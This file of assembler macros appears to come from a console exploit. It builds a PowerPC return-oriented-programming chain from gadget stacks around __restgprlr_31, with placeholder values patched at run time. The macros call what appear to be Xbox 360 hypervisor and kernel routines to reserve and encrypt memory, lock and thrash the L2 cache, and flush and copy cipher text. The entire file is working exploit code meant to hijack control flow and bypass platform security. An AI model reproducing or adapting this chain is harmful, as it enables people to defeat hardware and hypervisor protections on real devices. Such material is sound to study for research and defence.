

# Notes:
#   - All macros have a common pro/epilogue where the caller must transition in/out using the
#       __restgprlr_31 gadget.


###########################################################
# void CREATE_ENCRYPTED_ALLOCATION(base_addr, offset)
#
#   TODO
#
###########################################################
.macro CREATE_ENCRYPTED_ALLOCATION base_addr, offset

    _create_encrypted_allocation_base_addr = .

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131  # r31
        .long   __restgprlr_31          # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: write value of BootAnimCodePagePhysAddr into gadget data below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r4_offset) - _create_encrypted_allocation_base_addr), BootAnimCodePagePhysAddr
        
        ###########################################################
        # Gadget N: call HvxEncryptedReserveAllocation
        #
        #   r3 = virtual address
        #   r4 = physical address = BootAnimCodePagePhysAddr (to be updated by previous gadgets)
        #   r5 = allocation size = 64kb
        ###########################################################
        CALL_FUNC 2, HvxEncryptedReserveAllocation, R3H=0, R3L=EncryptedVirtualAddress, R4H=0, R4L=0x41414141, R5H=0, R5L=0x00010000
        
        ###########################################################
        # Gadget N: call HvxEncryptedEncryptAllocation
        #
        #   r3 = virtual address of encrypted VA range
        ###########################################################
        CALL_FUNC 2, HvxEncryptedEncryptAllocation, R3H=0, R3L=EncryptedVirtualAddress
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################

.endm

###########################################################
# void LOCK_AND_THRASH_L2(index, buffer_ptr_addr, base_addr, offset)
#
#   Allocates a buffer and uses it to lock a portion of the L2 cache.
#
###########################################################
.macro LOCK_AND_THRASH_L2 index, buffer_ptr_addr, base_addr, offset

    _lock_and_thrash_l2_base_addr = .

        #
        # 1. Allocate a 256KB buffer for the L2 thrashing.
        #
        CALL_FUNC 11, XPhysicalAlloc, R3H=0, R3L=0x40000, R4H=0, R4L=0xFFFFFFFF, R5H=0, R5L=0x40000, R6H=0, R6L=0x20000004
        .fill   0x50, 1, 0x00
        .long   0x00000000, \buffer_ptr_addr
        .long   stw_r3
        .long   0x00000000
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131
        .long   __restgprlr_31
        .long   0x00000000

        #
        # 2. Reserve the L2 cache range.
        #
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r4_offset) - _lock_and_thrash_l2_base_addr), \buffer_ptr_addr
        .if \index == 0
            CALL_FUNC 2, KeLockL2, R3H=0, R3L=0, R4H=0, R4L=0x41414141, R5H=0, R5L=0x40000, R6H=0, R6L=3, R7H=0, R7L=3
        .else
            CALL_FUNC 2, KeLockL2, R3H=0, R3L=1, R4H=0, R4L=0x41414141, R5H=0, R5L=0x40000, R6H=0, R6L=12, R7H=0, R7L=12
        .endif

        #
        # 3. Fill the buffer with trash data.
        #
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((3f + cf_r3_offset) - _lock_and_thrash_l2_base_addr), \buffer_ptr_addr
        CALL_FUNC 3, memset, R3H=0, R3L=0x41414141, R4H=0, R4L=0x41, R5H=0, R5L=0x40000

        #
        # 4. Commit the L2 cache lock.
        #
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((4f + cf_r4_offset) - _lock_and_thrash_l2_base_addr), \buffer_ptr_addr
        .if \index == 0
            CALL_FUNC 4, KeLockL2, R3H=0, R3L=0, R4H=0, R4L=0x41414141, R5H=0, R5L=0x40000, R6H=0, R6L=0, R7H=0, R7L=3
        .else
            CALL_FUNC 4, KeLockL2, R3H=0, R3L=1, R4H=0, R4L=0x41414141, R5H=0, R5L=0x40000, R6H=0, R6L=0, R7H=0, R7L=12
        .endif

.endm

###########################################################
# void FREE_ENCRYPTED_ALLOCATION()
#
#   TODO
#
###########################################################
.macro FREE_ENCRYPTED_ALLOCATION

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131  # r31
        .long   __restgprlr_31          # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: call HvxEncryptedReleaseAllocation
        #
        #   r3 = virtual address
        ###########################################################
        CALL_FUNC 999, HvxEncryptedReleaseAllocation, R3H=0, R3L=EncryptedVirtualAddress
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################

.endm

###########################################################
# void FLUSH_AND_COPY_CIPHER_TEXT()
#
#   TODO
#
###########################################################
.macro FLUSH_AND_COPY_CIPHER_TEXT dstAddr, size, base_addr, offset

    _flush_and_copy_cipher_text_base_addr = .

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131  # r31
        .long   __restgprlr_31          # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: write CipherTextScratchBuffer into gadget data below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((9f + cf_r3_offset) - _flush_and_copy_cipher_text_base_addr), CipherTextScratchBuffer
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((8f + cf_r4_offset) - _flush_and_copy_cipher_text_base_addr), CipherTextScratchBuffer
        
        ###########################################################
        # Gadget N: write dstAddr into gadget data below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((8f + cf_r3_offset) - _flush_and_copy_cipher_text_base_addr), \dstAddr
        
        ###########################################################
        # Gadget N: call KeFlushCacheRange and flush cache for the encrypted virtual address range
        #
        #   r3 = address of data
        #   r4 = size of data
        ###########################################################
        CALL_FUNC 999, KeFlushCacheRange, R3H=0, R3L=EncryptedVirtualAddress, R4H=0, R4L=\size
        
        ###########################################################
        # Gadget N: call KeFlushCacheRange and flush cache for the unencrypted physical address range
        #
        #   r3 = address of data (to be filled in by previous gadgets)
        #   r4 = size of data
        ###########################################################
        CALL_FUNC 9, KeFlushCacheRange, R3H=0, R3L=0x41414141, R4H=0, R4L=\size
        
        ###########################################################
        # Gadget N: call memcpy and copy cipher text for data
        #
        #   r3 = destination address = dstAddr (to be filled in by previous gadgets)
        #   r4 = source address = unencrypted physical address (to be filled in by previous gadgets)
        #   r5 = size of data
        ###########################################################
        CALL_FUNC 8, memcpy, R3H=0, R3L=0x41414141, R4H=0, R4L=0x41414141, R5H=0, R5L=\size
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################

.endm

